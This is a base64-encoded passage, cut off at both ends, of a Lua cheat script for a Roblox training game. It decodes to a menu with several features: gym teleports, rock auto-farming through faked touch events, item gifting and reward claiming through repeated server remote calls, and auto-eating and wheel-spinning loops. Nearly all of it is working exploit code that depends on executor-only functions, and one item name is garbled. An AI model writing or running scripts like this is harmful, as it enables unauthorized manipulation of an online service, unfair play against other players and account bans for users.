uZAogICAgZW5kCn0pCgpSZWJpcnRoVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFRQIE11c2NsZSBLaW5nIEd5bSIsCiAgICBEZXNjID0gIlRlbGVwb3J0IHRvIE11c2NsZSBLaW5nIEd5bSIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICB0ZWxlcG9ydEVuYWJsZWQgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4gdGFzay5zcGF3bih0ZWxlcG9ydFRvTXVzY2xlS2luZykgZW5kCiAgICBlbmQKfSkKCi0tIFJvY2sgVGFiCmxvY2FsIFJvY2tUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJSb2NrIiwgSWNvbiA9ICJtb3VudGFpbiJ9KQoKLS0gRmFzdCBHbGl0Y2ggU2VjdGlvbgpSb2NrVGFiOlNlY3Rpb24oe1RpdGxlID0gIkZBU1QgR0xJVENIIn0pCgpsb2NhbCBzZWxlY3Ryb2NrID0gIiIKCi0tIFJvY2sgRmFybSBGdW5jdGlvbnMKbG9jYWwgZnVuY3Rpb24gY3JlYXRlUm9ja1RvZ2dsZSh0aXRsZSwgZGVzYywgcm9ja05hbWUsIGR1cmFiaWxpdHkpCiAgICBSb2NrVGFiOlRvZ2dsZSh7CiAgICAgICAgVGl0bGUgPSB0aXRsZSwKICAgICAgICBEZXNjID0gZGVzYywKICAgICAgICBWYWx1ZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIHNlbGVjdHJvY2sgPSByb2NrTmFtZQogICAgICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IGR1cmFiaWxpdHkgdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSBkdXJhYmlsaXR5IGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLlJpZ2h0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAiUHVuY2giIGFuZCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wodikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQKCi0tIFJvY2sgRmFybSBUb2dnbGVzCmNyZWF0ZVJvY2tUb2dnbGUoIkF1dG8gVGlueUlzbGFuZFJvY2sgWzBdIiwgIjAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJUaW55IElzbGFuZCBSb2NrIiwgMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBTdGFydGVySXNsYW5kUm9jayBbMTAwXSIsICIxMDAgRHVyYWJpbGl0eSBSZXF1aXJlZCIsICJTdGFydGVyIElzbGFuZCBSb2NrIiwgMTAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIExlZ2VuZEJlYWNoUm9jayBbNWtdIiwgIjUsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTGVnZW5kIEJlYWNoIFJvY2siLCA1MDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIEZyb3N0R3ltUm9jayBbMTUwa10iLCAiMTUwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIkZyb3N0IEd5bSBSb2NrIiwgMTUwMDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIE15dGhpY2FsR3ltUm9jayBbNDAwa10iLCAiNDAwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIk15dGhpY2FsIEd5bSBSb2NrIiwgNDAwMDAwKQpjcmVhdGVSb2NrVG9nZ2xlKCJBdXRvIEV0ZXJuYWxHeW1Sb2NrIFs3NTBrXSIsICI3NTAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiRXRlcm5hbCBHeW0gUm9jayIsIDc1MDAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBMZWdlbmRHeW1Sb2NrIFsxbV0iLCAiMSwwMDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiTGVnZW5kIEd5bSBSb2NrIiwgMTAwMDAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBNdXNjbGVLaW5nR3ltUm9jayBbNW1dIiwgIjUsMDAwLDAwMCBEdXJhYmlsaXR5IFJlcXVpcmVkIiwgIk11c2NsZSBLaW5nIEd5bSBSb2NrIiwgNTAwMDAwMCkKY3JlYXRlUm9ja1RvZ2dsZSgiQXV0byBBbmNpZW50SnVuZ2xlUm9jayBbMTBtXSIsICIxMCwwMDAsMDAwIER1cmFiaWxpdHkgUmVxdWlyZWQiLCAiQW5jaWVudCBKdW5nbGUgUm9jayIsIDEwMDAwMDAwKQoKLS0gRWdncyBUYWIKbG9jYWwgRWdnc1RhYiA9IFdpbmRvdzpUYWIoe1RpdGxlID0gIkVnZ3MiLCBJY29uID0gImdpZnQifSkKCi0tIFByb3RlaW4gRWdnIEdpZnRpbmcgU2VjdGlvbgpFZ2dzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdpZnRpbmcgUHJvdGVpbiBFZ2cifSkKCmxvY2FsIHByb3RlaW5FZ2dMYWJlbCA9IEVnZ3NUYWI6TGFiZWwoe1RpdGxlID0gIlByb3RlaW4gRWdncyIsIERlc2MgPSAiMCJ9KQpsb2NhbCBzZWxlY3RlZEVnZ1BsYXllciA9IG5pbApsb2NhbCBlZ2dDb3VudCA9IDAKCmxvY2FsIGVnZ0Ryb3Bkb3duID0gRWdnc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJQbGF5ZXIgdG8gR2lmdCBFZ2dzIiwKICAgIExpc3QgPSB7fSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkRGlzcGxheU5hbWUpCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwbHIuRGlzcGxheU5hbWUgPT0gc2VsZWN0ZWREaXNwbGF5TmFtZSB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZEVnZ1BsYXllciA9IHBscgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFBvcHVsYXRlIGRyb3Bkb3duIHdpdGggcGxheWVycwpmb3IgXywgcGxyIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvCiAgICBpZiBwbHIgfj0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgIGVnZ0Ryb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kCgpnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIGlmIHBsciB+PSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgZWdnRHJvcGRvd246QWRkKHBsci5EaXNwbGF5TmFtZSkKICAgIGVuZAplbmQpCgpFZ2dzVGFiOlRleHRib3goewogICAgVGl0bGUgPSAiQW1vdW50IG9mIEVnZ3MiLAogICAgRGVzYyA9ICJFbnRlciBudW1iZXIgb2YgZWdncyB0byBnaWZ0IiwKICAgIFBsYWNlaG9sZGVyID0gIjAiLAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBlZ2dDb3VudCA9IHRvbnVtYmVyKHRleHQpIG9yIDAKICAgIGVuZAp9KQoKRWdnc1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiR2lmdCBFZ2dzIiwKICAgIERlc2MgPSAiU2VuZCBwcm90ZWluIGVnZ3MgdG8gc2VsZWN0ZWQgcGxheWVyIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIHNlbGVjdGVkRWdnUGxheWVyIGFuZCBlZ2dDb3VudCA+IDAgdGhlbgogICAgICAgICAgICBmb3IgaSA9IDEsIGVnZ0NvdW50IGRvCiAgICAgICAgICAgICAgICBsb2NhbCBlZ2cgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5jb25zdW1hYmxlc0ZvbGRlcjpGaW5kRmlyc3RDaGlsZCgiUHJvdGVpbiBFZ2ciKQogICAgICAgICAgICAgICAgaWYgZWdnIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5naWZ0UmVtb3RlOkludm9rZVNlcnZlcigiZ2lmdFJlcXVlc3QiLCBzZWxlY3RlZEVnZ1BsYXllciwgZWdnKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIFRyb3BpY2FsIFNoYWtlIEdpZnRpbmcgU2VjdGlvbgpFZ2dzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkdpZnRpbmcgVHJvcGljYWwgU2hha2VzIn0pCgpsb2NhbCB0cm9waWNhbFNoYWtlTGFiZWwgPSBFZ2dzVGFiOkxhYmVsKHtUaXRsZSA9ICJUcm9waWNhbCBTaGFrZXMiLCBEZXNjID0gIjAifSkKbG9jYWwgc2VsZWN0ZWRTaGFrZVBsYXllciA9IG5pbApsb2NhbCBzaGFrZUNvdW50ID0gMAoKbG9jYWwgc2hha2VEcm9wZG93biA9IEVnZ3NUYWI6RHJvcGRvd24oewogICAgVGl0bGUgPSAiUGxheWVyIHRvIEdpZnQgVHJvcGljYWwgU2hha2VzIiwKICAgIExpc3QgPSB7fSwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHNlbGVjdGVkRGlzcGxheU5hbWUpCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwbHIuRGlzcGxheU5hbWUgPT0gc2VsZWN0ZWREaXNwbGF5TmFtZSB0aGVuCiAgICAgICAgICAgICAgICBzZWxlY3RlZFNoYWtlUGxheWVyID0gcGxyCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKZm9yIF8sIHBsciBpbiBpcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpKSBkbwogICAgaWYgcGxyIH49IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyIHRoZW4KICAgICAgICBzaGFrZURyb3Bkb3duOkFkZChwbHIuRGlzcGxheU5hbWUpCiAgICBlbmQKZW5kCgpnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIGlmIHBsciB+PSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllciB0aGVuCiAgICAgICAgc2hha2VEcm9wZG93bjpBZGQocGxyLkRpc3BsYXlOYW1lKQogICAgZW5kCmVuZCkKCkVnZ3NUYWI6VGV4dGJveCh7CiAgICBUaXRsZSA9ICJUcm9waWNhbCBTaGFrZXMgZ2lmdCIsCiAgICBEZXNjID0gIkVudGVyIG51bWJlciBvZiBzaGFrZXMgdG8gZ2lmdCIsCiAgICBQbGFjZWhvbGRlciA9ICIwIiwKICAgIFZhbHVlID0gIiIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgc2hha2VDb3VudCA9IHRvbnVtYmVyKHRleHQpIG9yIDAKICAgIGVuZAp9KQoKRWdnc1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiR2lmdCBUcm9waWNhbCBTaGFrZXMiLAogICAgRGVzYyA9ICJTZW5kIHRyb3BpY2FsIHNoYWtlcyB0byBzZWxlY3RlZCBwbGF5ZXIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgc2VsZWN0ZWRTaGFrZVBsYXllciBhbmQgc2hha2VDb3VudCA+IDAgdGhlbgogICAgICAgICAgICBmb3IgaSA9IDEsIHNoYWtlQ291bnQgZG8KICAgICAgICAgICAgICAgIGxvY2FsIHNoYWtlID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuY29uc3VtYWJsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIlRyb3BpY2FsIFNoYWtlIikKICAgICAgICAgICAgICAgIGlmIHNoYWtlIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5naWZ0UmVtb3RlOkludm9rZVNlcnZlcigiZ2lmdFJlcXVlc3QiLCBzZWxlY3RlZFNoYWtlUGxheWVyLCBzaGFrZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBJdGVtIENvdW50IFVwZGF0ZXIKbG9jYWwgZnVuY3Rpb24gdXBkYXRlSXRlbUNvdW50KCkKICAgIGxvY2FsIHByb3RlaW5FZ2dDb3VudCA9IDAKICAgIGxvY2FsIHRyb3BpY2FsU2hha2VDb3VudCA9IDAKCiAgICBsb2NhbCBiYWNrcGFjayA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiQmFja3BhY2siKQogICAgaWYgYmFja3BhY2sgdGhlbgogICAgICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBpdGVtLk5hbWUgPT0gIlByb3RlaW4gRWdnIiB0aGVuCiAgICAgICAgICAgICAgICBwcm90ZWluRWdnQ291bnQgPSBwcm90ZWluRWdnQ291bnQgKyAxCiAgICAgICAgICAgIGVsc2VpZiBpdGVtLk5hbWUgPT0gIlRyb3BpY2FsIFNoYWtlIiBvciBpdGVtLk5hbWUgPT0gIlBpw4PGksOG4oCZw4PigKDDouKCrOKEosODxpLDouKCrMWhw4PigJrDgsKxYXMiIHRoZW4KICAgICAgICAgICAgICAgIHRyb3BpY2FsU2hha2VDb3VudCA9IHRyb3BpY2FsU2hha2VDb3VudCArIDEKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBwcm90ZWluRWdnTGFiZWw6U2V0RGVzYyh0b3N0cmluZyhwcm90ZWluRWdnQ291bnQpKQogICAgdHJvcGljYWxTaGFrZUxhYmVsOlNldERlc2ModG9zdHJpbmcodHJvcGljYWxTaGFrZUNvdW50KSkKZW5kCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICB1cGRhdGVJdGVtQ291bnQoKQogICAgICAgIHRhc2sud2FpdCgwLjI1KQogICAgZW5kCmVuZCkKCi0tIEF1dG8gRmVhdHVyZXMgU2VjdGlvbgpFZ2dzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkF1dG8gRmVhdHVyZXMifSkKCi0tIEF1dG8gRWF0IEVnZyAoMzBtaW4pCmxvY2FsIGF1dG9FZ2dFbmFibGVkMzAgPSBmYWxzZQpsb2NhbCBmdW5jdGlvbiBhdXRvRWF0RWdnMzAoKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIHdoaWxlIGF1dG9FZ2dFbmFibGVkMzAgZG8KICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpCiAgICAgICAgaWYgdG9vbCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgdGFzay53YWl0KDE4MDApIC0tIDMwIG1pbnV0ZXMKICAgICAgICBlbHNlCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kCmVuZAoKRWdnc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBQcm90ZWluIEVnZyAoMzBtaW4pIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBlYXQgcHJvdGVpbiBlZ2dzIGV2ZXJ5IDMwIG1pbnV0ZXMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgYXV0b0VnZ0VuYWJsZWQzMCA9IHN0YXRlCiAgICAgICAgaWYgc3RhdGUgdGhlbiB0YXNrLnNwYXduKGF1dG9FYXRFZ2czMCkgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gRWF0IEVnZyAoMWhvdXIpCmxvY2FsIGF1dG9FZ2dFbmFibGVkNjAgPSBmYWxzZQpsb2NhbCBmdW5jdGlvbiBhdXRvRWF0RWdnNjAoKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIHdoaWxlIGF1dG9FZ2dFbmFibGVkNjAgZG8KICAgICAgICBsb2NhbCB0b29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQcm90ZWluIEVnZyIpCiAgICAgICAgaWYgdG9vbCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkKICAgICAgICAgICAgdGFzay53YWl0KDM2MDApIC0tIDEgaG91cgogICAgICAgIGVsc2UKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpFZ2dzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIFByb3RlaW4gRWdnICgxaG91cikiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGVhdCBwcm90ZWluIGVnZ3MgZXZlcnkgaG91ciIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvRWdnRW5hYmxlZDYwID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oYXV0b0VhdEVnZzYwKSBlbmQKICAgIGVuZAp9KQoKLS0gQXV0byBFYXQgQWxsIFNuYWNrcwpsb2NhbCBlYXRTbmFja0VuYWJsZWQgPSBmYWxzZQpsb2NhbCBzbmFja3MgPSB7IlByb3RlaW4gRWdnIiwgIlRyb3BpY2FsIFNoYWtlIn0gLS0gQWRkIG90aGVyIHNuYWNrIG5hbWVzIGFzIG5lZWRlZAoKbG9jYWwgZnVuY3Rpb24gZWF0QWxsU25hY2soKQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIHdoaWxlIGVhdFNuYWNrRW5hYmxlZCBkbwogICAgICAgIGZvciBfLCBzbmFja05hbWUgaW4gaXBhaXJzKHNuYWNrcykgZG8KICAgICAgICAgICAgbG9jYWwgdG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZChzbmFja05hbWUpCiAgICAgICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgdG9vbDpBY3RpdmF0ZSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdChtYXRoLnJhbmRvbSgxLCAyKSkKICAgIGVuZAplbmQKCkVnZ3NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gRWF0IEFsbCBTbmFja3MiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGNvbnN1bWUgYWxsIGF2YWlsYWJsZSBzbmFja3MiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZWF0U25hY2tFbmFibGVkID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oZWF0QWxsU25hY2spIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIFNwaW4gV2hlZWwKbG9jYWwgYXV0b1NwaW5XaGVlbEVuYWJsZWQgPSBmYWxzZQoKbG9jYWwgZnVuY3Rpb24gYXV0b1NwaW5XaGVlbCgpCiAgICB3aGlsZSBhdXRvU3BpbldoZWVsRW5hYmxlZCBkbwogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLm9wZW5Gb3J0dW5lV2hlZWxSZW1vdGU6SW52b2tlU2VydmVyKCJvcGVuRm9ydHVuZVdoZWVsIiwgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLmZvcnR1bmVXaGVlbENoYW5jZXNbIkZvcnR1bmUgV2hlZWwiXSkKICAgICAgICB0YXNrLndhaXQoMSkKICAgIGVuZAplbmQKCkVnZ3NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gU3BpbiBGb3J0dW5lIFdoZWVsIiwKICAgIERlc2MgPSAiQXV0b21hdGljYWxseSBzcGluIHRoZSBmb3J0dW5lIHdoZWVsIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGF1dG9TcGluV2hlZWxFbmFibGVkID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSB0aGVuIHRhc2suc3Bhd24oYXV0b1NwaW5XaGVlbCkgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gQ2xhaW0gR2lmdApsb2NhbCBhdXRvQ2xhaW1HaWZ0ID0gZmFsc2UKCkVnZ3NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkF1dG8gQ2xhaW0gR2lmdCIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgY2xhaW0gZnJlZSBnaWZ0cyIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBhdXRvQ2xhaW1HaWZ0ID0gc3RhdGUKICAgICAgICB3aGlsZSBhdXRvQ2xhaW1HaWZ0IGRvCiAgICAgICAgICAgIGZvciBpID0gMSwgOCBkbwogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuZnJlZUdpZnRDbGFpbVJlbW90ZTpJbnZva2VTZXJ2ZXIoImNsYWltR2lmdCIsIGkpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gR3ltIFRhYgpsb2NhbCBHeW1UYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJHeW0iLCBJY29uID0gImR1bWJiZWxsIn0pCgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAiR1lNIE1BQ0hJTkVTIn0pCgpsb2NhbCBjdXJyZW50TWFjaGluZSA9IG5pbApsb2NhbCBjdXJyZW50TWFjaGluZUFjdGl2ZSA9IGZhbHNlCgotLSBGdW5jdGlvbiB0byB1c2UgbWFjaGluZSAodGVsZXBvcnQgb25jZSkKbG9jYWwgZnVuY3Rpb24gc2V0dXBNYWNoaW5lKG1hY2hpbmVOYW1lKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIG1hY2hpbmUgPSB3b3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQobWFjaGluZU5hbWUpCiAgICAgICAgaWYgbWFjaGluZSBhbmQgbWFjaGluZTpGaW5kRmlyc3RDaGlsZCgiaW50ZXJhY3RTZWF0IikgdGhlbgogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gbWFjaGluZS5pbnRlcmFjdFNlYXQuQ0ZyYW1lCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgY3VycmVudE1hY2hpbmUgPSBtYWNoaW5lTmFtZQogICAgICAgICAgICAgICAgY3VycmVudE1hY2hpbmVBY3RpdmUgPSB0cn